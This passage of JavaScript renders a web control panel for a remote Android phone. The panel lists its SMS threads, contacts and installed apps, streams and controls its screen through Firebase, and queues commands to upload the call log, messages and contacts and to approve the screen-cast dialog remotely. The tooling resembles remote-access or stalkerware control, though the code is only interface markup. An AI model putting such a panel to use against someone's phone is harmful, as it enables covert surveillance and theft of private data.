    if (!threadsMap.has(m.phoneNumber)) {
      threadsMap.set(m.phoneNumber, {
        phoneNumber: m.phoneNumber,
        senderName: m.senderName,
        lastBody: m.body,
        timestampLabel: m.timestampLabel,
        unreadCount: m.unread ? 1 : 0,
      });
    } else if (m.unread) {
      threadsMap.get(m.phoneNumber).unreadCount += 1;
    }
  }
  const threads = Array.from(threadsMap.values());

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
        <div>
          <h2 class="text-sm font-bold text-white">Messages</h2>
          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'messages'))} · ${threads.length} threads</p>
        </div>
        <div class="flex items-center gap-1.5 shrink-0">
          <button
            type="button"
            data-send-upload-cmd="UPLOAD_MESSAGES"
            data-upload-target="messages"
            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
          >
            ↑ Upload Cmd
          </button>
          <button type="button" data-action="open-new-msg" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">
            + New
          </button>
        </div>
      </div>

      <div class="divide-y divide-slate-800/80">
        ${threads.length === 0 ? `
          <div class="p-6 text-center">
            <p class="text-xs text-slate-400">No SMS threads yet.</p>
          </div>
        ` : threads
          .map(
            (t) => `
            <button
              type="button"
              data-open-thread="${esc(t.phoneNumber)}"
              class="w-full px-4 py-3 text-left flex items-start justify-between gap-3 hover:bg-slate-900/70 transition-colors cursor-pointer"
            >
              <div class="min-w-0">
                <p class="text-xs font-semibold text-white truncate">
                  ${esc(t.senderName)}${t.unreadCount > 0 ? ` · <span class="text-blue-400">${t.unreadCount} new</span>` : ''}
                </p>
                <p class="text-[11px] text-slate-400 truncate mt-0.5">${esc(t.lastBody)}</p>
              </div>
              <span class="text-[10px] font-mono-tabular text-slate-500 shrink-0">${esc(t.timestampLabel)}</span>
            </button>
          `
          )
          .join('')}
      </div>
    </div>
  `;
}

function renderContactsScreen() {
  if (state.showAddContactForm) {
    return `
      <div class="min-h-full bg-[#040a07] flex flex-col">
        <div class="sticky top-0 bg-[#040a07] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
          <h2 class="text-sm font-bold text-white">Add Contact</h2>
          <button type="button" data-action="close-add-contact" class="text-xs text-slate-400 hover:text-white cursor-pointer">Cancel</button>
        </div>
        <form id="form-add-contact" class="p-4 space-y-3">
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Full Name</label>
            <input name="name" type="text" maxlength="80" required placeholder="e.g. Kabir Joshi" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Phone Number</label>
            <input name="phoneNumber" type="text" maxlength="32" required placeholder="+91 98100 55443" class="w-full h-10 px-3 text-xs font-mono-tabular bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Email</label>
            <input name="email" type="email" maxlength="120" placeholder="kabir@example.com" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Company</label>
            <input name="company" type="text" maxlength="80" placeholder="Mobile Engineering" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <button type="submit" class="w-full h-11 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold cursor-pointer">Save Contact</button>
        </form>
      </div>
    `;
  }

  const term = state.contactSearch.toLowerCase();
  const filtered = state.contacts.filter(
    (c) =>
      !term ||
      (c.name || '').toLowerCase().includes(term) ||
      (c.phoneNumber || '').toLowerCase().includes(term)
  );

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800 space-y-2.5">
        <div class="flex items-center justify-between gap-2">
          <div>
            <h2 class="text-sm font-bold text-white">Contacts</h2>
            <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'contacts'))} · ${state.contacts.length} saved</p>
          </div>
          <div class="flex items-center gap-1.5 shrink-0">
            <button
              type="button"
              data-send-upload-cmd="UPLOAD_CONTACTS"
              data-upload-target="contacts"
              class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
            >
              ↑ Upload Cmd
            </button>
            <button type="button" data-action="open-add-contact" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Add</button>
          </div>
        </div>
        <input
          id="input-contact-search"
          type="search"
          value="${esc(state.contactSearch)}"
          placeholder="Search name or phone..."
          class="w-full h-9 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white placeholder:text-slate-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
        />
      </div>

      <div class="divide-y divide-slate-800/80">
        ${filtered.length === 0 ? `
          <div class="p-6 text-center text-xs text-slate-400">No contacts match your search.</div>
        ` : filtered
          .map((c) => {
            const expanded = state.expandedContactId === c.id;
            const initials = (c.name || '?').slice(0, 2).toUpperCase();
            return `
              <div class="px-4 py-3">
                <button
                  type="button"
                  data-toggle-contact="${esc(c.id)}"
                  class="w-full flex items-center justify-between gap-3 text-left cursor-pointer"
                >
                  <div class="flex items-center gap-3 min-w-0">
                    <span class="w-9 h-9 rounded-full bg-indigo-600/30 border border-indigo-500/40 text-indigo-200 text-xs font-bold flex items-center justify-center shrink-0">${esc(initials)}</span>
                    <div class="min-w-0">
                      <p class="text-xs font-semibold text-white truncate">${esc(c.name)}${c.favorite ? ' ★' : ''}</p>
                      <p class="text-[11px] font-mono-tabular text-slate-400 truncate">${esc(c.phoneNumber)}</p>
                    </div>
                  </div>
                  <span class="text-[11px] text-slate-500 shrink-0">${expanded ? 'Hide' : 'Open'}</span>
                </button>
                ${expanded ? `
                  <div class="mt-3 pt-3 border-t border-slate-800/80 space-y-2 text-[11px] text-slate-300">
                    ${c.company ? `<p>Company: <span class="text-white">${esc(c.company)}</span></p>` : ''}
                    ${c.email ? `<p>Email: <span class="text-white font-mono-tabular">${esc(c.email)}</span></p>` : ''}
                    <div class="grid grid-cols-4 gap-1.5 pt-1">
                      <button type="button" data-contact-call="${esc(c.id)}" class="py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white font-medium cursor-pointer">Call</button>
                      <button type="button" data-contact-msg="${esc(c.id)}" class="py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-medium cursor-pointer">SMS</button>
                      <button type="button" data-contact-fav="${esc(c.id)}" class="py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium cursor-pointer">${c.favorite ? 'Unstar' : 'Star'}</button>
                      <button type="button" data-contact-del="${esc(c.id)}" class="py-1.5 rounded-lg bg-red-950/70 hover:bg-red-900/70 text-red-300 font-medium cursor-pointer">Delete</button>
                    </div>
                  </div>
                ` : ''}
              </div>
            `;
          })
          .join('')}
      </div>
    </div>
  `;
}

function renderAppsScreen() {
  if (state.showInstallAppForm) {
    return `
      <div class="min-h-full bg-[#040a07] flex flex-col">
        <div class="sticky top-0 bg-[#040a07] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
          <h2 class="text-sm font-bold text-white">Install APK Package</h2>
          <button type="button" data-action="close-install-app" class="text-xs text-slate-400 hover:text-white cursor-pointer">Cancel</button>
        </div>
        <form id="form-install-app" class="p-4 space-y-3">
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">App Name</label>
            <input name="name" type="text" maxlength="64" required placeholder="e.g. Sensor Monitor" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Package ID</label>
            <input name="packageName" type="text" maxlength="128" required placeholder="com.droidlab.sensors" class="w-full h-10 px-3 text-xs font-mono-tabular bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
          </div>
          <div class="grid grid-cols-2 gap-2">
            <div>
              <label class="block text-[11px] text-slate-400 mb-1">Version</label>
              <input name="version" type="text" maxlength="24" value="1.0.0" required class="w-full h-10 px-3 text-xs font-mono-tabular bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
            </div>
            <div>
              <label class="block text-[11px] text-slate-400 mb-1">Size (MB)</label>
              <input name="sizeMb" type="number" min="1" max="10000" value="28" required class="w-full h-10 px-3 text-xs font-mono-tabular bg-[#07130e] border border-emerald-500/20 rounded-lg text-white" />
            </div>
          </div>
          <div>
            <label class="block text-[11px] text-slate-400 mb-1">Category</label>
            <select name="category" class="w-full h-10 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white">
              <option value="Utilities">Utilities</option>
              <option value="Productivity">Productivity</option>
              <option value="Communication">Communication</option>
              <option value="Media">Media</option>
            </select>
          </div>
          <button type="submit" class="w-full h-11 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold cursor-pointer">Install App</button>
        </form>
      </div>
    `;
  }

  const term = state.appSearch.toLowerCase();
  const categories = ['All', 'Communication', 'System', 'Utilities', 'Media', 'Productivity'];
  const filtered = state.apps.filter((a) => {
    const matchCat = state.appCategory === 'All' || a.category === state.appCategory;
    const matchTerm =
      !term ||
      (a.name || '').toLowerCase().includes(term) ||
      (a.packageName || '').toLowerCase().includes(term);
    return matchCat && matchTerm;
  });

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800 space-y-2.5">
        <div class="flex items-center justify-between gap-2">
          <div>
            <h2 class="text-sm font-bold text-white">App List</h2>
            <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'apps'))} · ${state.apps.length} installed</p>
          </div>
          <div class="flex items-center gap-1.5 shrink-0">
            <button
              type="button"
              data-send-upload-cmd="UPLOAD_APPS"
              data-upload-target="apps"
              class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
            >
              ↑ Upload Cmd
            </button>
            <button type="button" data-action="open-install-app" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Install</button>
          </div>
        </div>

        <input
          id="input-app-search"
          type="search"
          value="${esc(state.appSearch)}"
          placeholder="Filter apps or packages..."
          class="w-full h-9 px-3 text-xs bg-[#07130e] border border-emerald-500/20 rounded-lg text-white placeholder:text-slate-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
        />

        <div class="flex items-center gap-1 overflow-x-auto pb-0.5">
          ${categories
            .map(
              (cat) => `
              <button
                type="button"
                data-app-cat="${esc(cat)}"
                class="px-2.5 py-1 text-[11px] font-medium rounded-md whitespace-nowrap cursor-pointer ${state.appCategory === cat ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
              >
                ${esc(cat)}
              </button>
            `
            )
            .join('')}
        </div>
      </div>

      <div class="divide-y divide-slate-800/80">
        ${filtered.length === 0 ? `
          <div class="p-6 text-center text-xs text-slate-400">No applications found.</div>
        ` : filtered
          .map((a) => {
            const glyph = getAppGlyph(a.name);
            return `
              <div class="px-4 py-3 flex items-center justify-between gap-3">
                <button
                  type="button"
                  data-launch-app="${esc(a.name)}"
                  class="flex items-center gap-3 min-w-0 text-left cursor-pointer ${a.enabled ? '' : 'opacity-50'}"
                >
                  <span class="w-10 h-10 rounded-xl ${glyph.bg} text-white text-xs font-bold flex items-center justify-center shrink-0">${esc(glyph.label)}</span>
                  <div class="min-w-0">
                    <p class="text-xs font-semibold text-white truncate">${esc(a.name)}</p>
                    <p class="text-[10px] font-mono-tabular text-slate-400 truncate">${esc(a.packageName)}</p>
                    <p class="text-[10px] text-slate-500 mt-0.5">${esc(a.category)} · v${esc(a.version)} · ${esc(a.sizeMb)} MB</p>
                  </div>
                </button>

                <div class="flex items-center gap-1.5 shrink-0">
                  <button
                    type="button"
                    data-toggle-app="${esc(a.id)}"
                    class="px-2.5 py-1.5 text-[11px] font-medium rounded-lg cursor-pointer ${a.enabled ? 'bg-slate-800 text-slate-200 hover:bg-slate-700' : 'bg-emerald-600 text-white'}"
                  >
                    ${a.enabled ? 'Enabled' : 'Disabled'}
                  </button>
                  ${!a.systemApp ? `
                    <button
                      type="button"
                      data-uninstall-app="${esc(a.id)}"
                      class="px-2 py-1.5 text-[11px] text-slate-400 hover:text-red-400 cursor-pointer"
                      aria-label="Uninstall app"
                    >
                      ×
                    </button>
                  ` : ''}
                </div>
              </div>
            `;
          })
          .join('')}
      </div>
    </div>
  `;
}

function clearScreenOverlayNow() {
  if (state.markerClearTimer) {
    clearTimeout(state.markerClearTimer);
    state.markerClearTimer = null;
  }
  state.lastTapMarker = null;
  state.swipeTrail = null;
  const layer = document.getElementById('remote-screen-dot-layer');
  if (layer) layer.innerHTML = '';
}

function scheduleClearScreenOverlay(delayMs = 210) {
  if (state.markerClearTimer) {
    clearTimeout(state.markerClearTimer);
  }
  state.markerClearTimer = setTimeout(() => {
    state.markerClearTimer = null;
    state.lastTapMarker = null;
    state.swipeTrail = null;
    const layer = document.getElementById('remote-screen-dot-layer');
    if (layer) layer.innerHTML = '';
  }, delayMs);
}

function buildTapDotMarkup(marker) {
  if (!marker) return '';
  const left = `${(marker.xPercent * 100).toFixed(2)}%`;
  const top = `${(marker.yPercent * 100).toFixed(2)}%`;
  if (marker.pressed) {
    return `
      <span
        class="tap-dot-core bg-cyan-400"
        style="left:${left};top:${top}"
      ></span>
    `;
  }
  return `
    <span
      class="tap-dot-ring border-2 border-emerald-400 bg-emerald-400/30"
      style="left:${left};top:${top}"
    ></span>
    <span
      class="tap-dot-core tap-dot-fade bg-emerald-400"
      style="left:${left};top:${top}"
    ></span>
  `;
}

function buildSwipeTrailMarkup(trail) {
  if (!trail) return '';
  const x1 = (trail.startXPercent * 100).toFixed(2);
  const y1 = (trail.startYPercent * 100).toFixed(2);
  const x2 = (trail.endXPercent * 100).toFixed(2);
  const y2 = (trail.endYPercent * 100).toFixed(2);
  const lineColor = trail.active ? '#22d3ee' : '#34d399';
  const dotClass = trail.active ? 'bg-cyan-400' : 'bg-emerald-400 tap-dot-fade';
  const wrapClass = trail.active ? '' : 'tap-dot-fade';

  return `
    <div class="absolute inset-0 pointer-events-none ${wrapClass}">
      <svg class="absolute inset-0 w-full h-full pointer-events-none" viewBox="0 0 100 100" preserveAspectRatio="none">
        <line
          x1="${x1}"
          y1="${y1}"
          x2="${x2}"
          y2="${y2}"
          stroke="${lineColor}"
          stroke-width="1.3"
          stroke-linecap="round"
          stroke-opacity="0.88"
        />
      </svg>
      <span
        class="absolute w-3 h-3 rounded-full border-2 border-white/80 bg-slate-900/80 pointer-events-none"
        style="left:${x1}%;top:${y1}%;transform:translate3d(-50%,-50%,0)"
      ></span>
      ${
        trail.active
          ? ''
          : `<span class="tap-dot-ring border-2 border-emerald-400 bg-emerald-400/25" style="left:${x2}%;top:${y2}%"></span>`
      }
      <span
        class="tap-dot-core ${dotClass}"
        style="left:${x2}%;top:${y2}%"
      ></span>
    </div>
  `;
}

function renderTapDotLayer(marker) {
  const layer = document.getElementById('remote-screen-dot-layer');
  if (layer) {
    layer.innerHTML = buildTapDotMarkup(marker);
  }
  const readout = document.getElementById('remote-screen-coord-readout');
  if (readout && marker) {
    readout.textContent = `TAP (${marker.x}, ${marker.y})`;
  }
}

function renderSwipeTrailLayer(trail) {
  const layer = document.getElementById('remote-screen-dot-layer');
  if (layer) {
    layer.innerHTML = buildSwipeTrailMarkup(trail);
  }
  const readout = document.getElementById('remote-screen-coord-readout');
  if (readout && trail) {
    readout.textContent = `SWIPE (${trail.startX},${trail.startY}) → (${trail.endX},${trail.endY})`;
  }
}

async function smoothSwapRemoteScreenImage(nextSrc) {
  if (!nextSrc || state.lastCommittedFrameSrc === nextSrc || state.latestPendingFrameSrc === nextSrc) return;
  state.latestPendingFrameSrc = nextSrc;
  const token = ++state.frameSwapToken;

  const baseImg = document.getElementById('remote-screen-image');
  const nextImg = document.getElementById('remote-screen-image-next');
  if (!baseImg) return;

  if (!nextImg) {
    try {
      const preloader = new Image();
      preloader.decoding = 'sync';
      preloader.src = nextSrc;
      if (typeof preloader.decode === 'function') await preloader.decode();
    } catch {
      // Fallback
    }
    if (token !== state.frameSwapToken || state.screen !== 'screen') return;
    baseImg.src = nextSrc;
    state.lastCommittedFrameSrc = nextSrc;
    state.latestPendingFrameSrc = '';
    return;
  }

  try {
    nextImg.decoding = 'sync';
    nextImg.src = nextSrc;
    if (typeof nextImg.decode === 'function') {
      await nextImg.decode();
    } else if (!nextImg.complete) {
      await new Promise((resolve) => {
        nextImg.onload = resolve;
        nextImg.onerror = resolve;
      });
    }
  } catch {
    // Fallback to direct swap if decode throws
  }

  if (token !== state.frameSwapToken || state.screen !== 'screen') return;

  // Instant opaque swap (no transparency ghosting/reflection)
  nextImg.style.transition = 'none';
  nextImg.style.visibility = 'visible';
  nextImg.style.opacity = '1';

  try {
    baseImg.decoding = 'sync';
    baseImg.src = nextSrc;
    if (typeof baseImg.decode === 'function') {
      await baseImg.decode();
    }
  } catch {
    // Ignore
  }

  if (token !== state.frameSwapToken || state.screen !== 'screen') return;

  state.lastCommittedFrameSrc = nextSrc;
  state.latestPendingFrameSrc = '';
  nextImg.style.visibility = 'hidden';
  nextImg.style.opacity = '0';
}

function renderLiveScreenView() {
  const sc = state.screenData;
  const ctrl = state.screenControl;
  const tapMarker = state.lastTapMarker;
  const mode = state.screenControlMode;
  const sizeMode = state.screenSizeMode || 'normal';
  const isMini = sizeMode === 'mini';
  const isMax = sizeMode === 'max';
  const { streaming, allowed, started, stopped } = getEffectiveCastState();
  const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : 'Waiting';
  state.lastCommittedFrameSrc = sc?.imageSrc || '';
  state.latestPendingFrameSrc = '';

  const imgHeightClass = isMax
    ? 'max-h-[calc(100dvh-146px)]'
    : isMini
      ? 'max-h-[190px] sm:max-h-[220px]'
      : 'max-h-[calc(100dvh-318px)]';

  const fallbackHeightClass = isMax
    ? 'h-[min(640px,calc(100dvh-156px))]'
    : isMini
      ? 'h-[190px] sm:h-[220px]'
      : 'h-[min(370px,calc(100dvh-328px))]';

  return `
    <div class="h-full min-h-0 bg-[#040a07] flex flex-col overflow-hidden">
      <div class="shrink-0 bg-[#040a07]/95 backdrop-blur-md px-3 sm:px-4 py-2 border-b border-slate-800 flex items-center justify-between gap-2">
        <div class="min-w-0">
          <h2 class="text-xs sm:text-sm font-bold text-white truncate">Live Screen</h2>
          <p id="remote-screen-subtitle" class="text-[10px] sm:text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
        </div>
        <div class="flex items-center gap-1 shrink-0">
          <span
            id="remote-screen-live-badge"
            class="px-1.5 py-0.5 text-[9px] sm:text-[10px] font-mono-tabular font-semibold rounded-md border ${
              streaming
                ? 'bg-emerald-500/20 border-emerald-400/50 text-emerald-300'
                : allowed
                  ? 'bg-cyan-500/15 border-cyan-400/40 text-cyan-300'
                  : 'bg-slate-900 border-slate-700 text-slate-400'
            }"
          >${streaming ? 'LIVE' : allowed ? 'ALLOWED' : 'IDLE'}</span>
          <div class="inline-flex items-center p-0.5 rounded-lg bg-[#07130e] border border-emerald-500/25 text-[10px] font-mono-tabular">
            <button
              type="button"
              data-screen-size="mini"
              class="px-1.5 py-0.5 rounded cursor-pointer ${isMini ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-white'}"
              title="Minimize screen preview"
            >
              Mini
            </button>
            <button
              type="button"
              data-screen-size="normal"
              class="px-1.5 py-0.5 rounded cursor-pointer ${sizeMode === 'normal' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}"
              title="Default screen size"
            >
              Fit
            </button>
            <button
              type="button"
              data-screen-size="max"
              class="px-1.5 py-0.5 rounded cursor-pointer ${isMax ? 'bg-emerald-500 text-slate-950 font-bold' : 'text-slate-400 hover:text-white'}"
              title="Maximize screen full view"
            >
              Max
            </button>
          </div>
          <button
            type="button"
            data-send-upload-cmd="CAPTURE_SCREEN"
            data-upload-target="screen"
            class="px-2 py-1 text-[10px] sm:text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
            title="Capture screenshot"
          >
            ↻
          </button>
        </div>
      </div>

      ${isMax ? '' : `
      <div class="shrink-0 px-3 pt-1.5 pb-1">
        <div class="w-full max-w-md mx-auto grid grid-cols-3 gap-1.5">
          <button
            type="button"
            id="btn-cast-allow"
            data-cast-step="allow"
            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
              allowed
                ? 'bg-cyan-500/20 border-cyan-400/60 text-cyan-200'
                : 'bg-[#07130e] border-cyan-500/35 text-cyan-300 hover:bg-cyan-500/15'
            }"
          >
            ${allowed ? '✓ 1. Allow' : '1. Allow'}
          </button>
          <button
            type="button"
            id="btn-cast-start"
            data-cast-step="start"
            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
              started
                ? 'bg-emerald-500/25 border-emerald-400/70 text-emerald-200'
                : 'bg-[#07130e] border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/15'
            }"
          >
            ${streaming ? '● 2. Live' : started ? '▶ 2. Starting' : '2. Start'}
          </button>
          <button
            type="button"
            id="btn-cast-stop"
            data-cast-step="stop"
            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
              stopped
                ? 'bg-red-500/25 border-red-400/70 text-red-200'
                : 'bg-[#07130e] border-red-500/35 text-red-300 hover:bg-red-500/15'
            }"
          >
            ${stopped ? '■ 3. Stopped' : '3. Stop'}
          </button>
        </div>
      </div>

      <div class="shrink-0 px-3 pt-1 pb-1">
        <div class="w-full max-w-md mx-auto flex items-center justify-between gap-2 px-2.5 py-1.5 rounded-xl bg-[#07130e] border border-emerald-500/20 text-[10px] sm:text-[11px] font-mono-tabular">
          <div class="flex items-center gap-1 shrink-0">
            <button
              type="button"
              data-screen-mode="tap"
              class="px-2 py-1 rounded-md cursor-pointer ${mode === 'tap' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
            >
              Tap
            </button>
            <button
              type="button"
              data-screen-mode="swipe"
              class="px-2 py-1 rounded-md cursor-pointer ${mode === 'swipe' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
            >
              Swipe
            </button>
          </div>
          <span id="remote-screen-coord-readout" class="text-emerald-300 truncate text-right">
            ${tapMarker ? `TAP (${tapMarker.x}, ${tapMarker.y})` : ctrl?.action ? `${String(ctrl.action).toUpperCase()} (${ctrl.x ?? ctrl.startX ?? 0}, ${ctrl.y ?? ctrl.startY ?? 0})` : 'Tap screen to control'}
          </span>
        </div>
      </div>
      `}

      <div class="flex-1 min-h-0 w-full flex items-center justify-center ${isMax ? 'px-1.5 py-1' : 'px-3 py-1'} overflow-hidden">
        <div
          id="remote-screen-stage"
          class="relative inline-flex items-center justify-center max-w-full max-h-full bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
          title="Tap or drag on the screen to send control coordinates to Firebase RTDB"
        >
          ${sc?.imageSrc ? `
            <img
              id="remote-screen-image"
              src="${esc(sc.imageSrc)}"
              alt="Live Android Device Screen"
              draggable="false"
              decoding="sync"
              class="block max-w-full ${imgHeightClass} w-auto h-auto object-contain pointer-events-none select-none"
            />
            <img
              id="remote-screen-image-next"
              alt=""
              aria-hidden="true"
              draggable="false"
              decoding="sync"
              style="opacity:0;visibility:hidden"
              class="absolute inset-0 w-full h-full object-contain pointer-events-none select-none"
            />
          ` : `
            <div
              id="remote-screen-fallback"
              class="${fallbackHeightClass} aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
            >
              <div class="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-xs">
                B64
              </div>
              <div class="space-y-1">
                <p class="text-[11px] font-mono-tabular font-semibold text-emerald-300">AWAITING_BASE64_SCREEN</p>
                <p class="text-[10px] sm:text-[11px] text-slate-400 leading-relaxed">
                  First tap <span class="font-mono-tabular text-cyan-300">1. Allow</span> then <span class="font-mono-tabular text-emerald-300">2. Start</span> to cast <span class="font-mono-tabular text-emerald-400 break-all">${esc(devicePath(state.activeUid, 'screen'))}</span>.
                </p>
              </div>
            </div>
          `}
          <div id="remote-screen-dot-layer" class="absolute inset-0 pointer-events-none overflow-hidden">
            ${state.swipeTrail ? buildSwipeTrailMarkup(state.swipeTrail) : buildTapDotMarkup(tapMarker)}
          </div>
        </div>
      </div>

      <div class="shrink-0 px-3 pt-1 pb-2 space-y-1.5">
        ${isMax ? '' : `
        <form id="form-screen-send-msg" class="w-full max-w-md mx-auto flex items-center gap-1.5">
          <input
            id="input-screen-msg"
            name="text"
            type="text"
            maxlength="500"
            autocomplete="off"
            placeholder="Type msg / text for screen..."
            class="flex-1 min-w-0 h-8 px-2.5 text-xs bg-[#07130e] border border-emerald-500/25 focus:border-emerald-400 focus:outline-none rounded-lg text-white placeholder:text-slate-500"
          />
          <button
            type="submit"
            class="h-8 px-3 text-[11px] font-mono-tabular font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer shrink-0"
          >
            Send
          </button>
          <button
            type="button"
            data-screen-key="ENTER"
            title="Send Enter / Done key"
            class="h-8 px-2.5 text-[11px] font-mono-tabular font-semibold bg-[#07130e] border border-cyan-500/35 hover:border-cyan-400 text-cyan-300 rounded-lg cursor-pointer shrink-0"
          >
            ↵
          </button>
        </form>
        `}
        <div class="w-full max-w-md mx-auto grid grid-cols-4 gap-1.5 sm:gap-2">
          <button
            type="button"
            data-screen-key="BACK"
            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
          >
            ◁ Back
          </button>
          <button
            type="button"
            data-screen-key="HOME"
            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
          >
            ○ Home
          </button>
          <button
            type="button"
            data-screen-key="RECENTS"
            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
          >
            □ Recents
          </button>
          <button
            type="button"
            data-screen-key="POWER"
            class="py-1.5 sm:py-2 text-[10px] sm:text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
          >
            ⏻ Wake
          </button>
        </div>
      </div>
    </div>
  `;
}

function renderCommandsScreen() {
  const quickPresets = [
    { cmd: 'UPLOAD_CALLLOG', target: 'calllog', label: 'Upload Call Log', desc: `${state.calllog.length} cached` },
    { cmd: 'UPLOAD_MESSAGES', target: 'messages', label: 'Upload Messages', desc: `${state.messages.length} cached` },
    { cmd: 'UPLOAD_CONTACTS', target: 'contacts', label: 'Upload Contacts', desc: `${state.contacts.length} cached` },
    { cmd: 'UPLOAD_APPS', target: 'apps', label: 'Upload App List', desc: `${state.apps.length} cached` },
    { cmd: 'UPLOAD_STATUS', target: 'status', label: 'Refresh Status', desc: 'Battery & Online' },
    { cmd: 'UPLOAD_ALL', target: 'all', label: 'Upload All Lists', desc: 'Full RTDB sync' },
    { cmd: 'ALLOW_SCREEN_PERMISSION', target: 'screen', label: '1. Allow Screen Popup', desc: 'Approve cast dialog' },
    { cmd: 'START_SCREEN_STREAM', target: 'screen', label: '2. Start Screen Cast', desc: 'Begin Base64 stream' },
    { cmd: 'STOP_SCREEN_STREAM', target: 'screen', label: '3. Stop Screen Cast', desc: 'End Base64 stream' },
  ];

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
        <div>
          <h2 class="text-sm font-bold text-white">List Upload Command Center</h2>
          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'commands'))} · ${state.commands.length}/${MAX_COMMAND_QUEUE} commands (max ${MAX_COMMAND_QUEUE})</p>
        </div>
        ${state.commands.length > 0 ? `
          <button type="button" data-action="clear-all-commands" class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-medium bg-red-950/60 border border-red-500/30 text-red-300 hover:bg-red-900/60 rounded-lg cursor-pointer shrink-0">
            Clear All
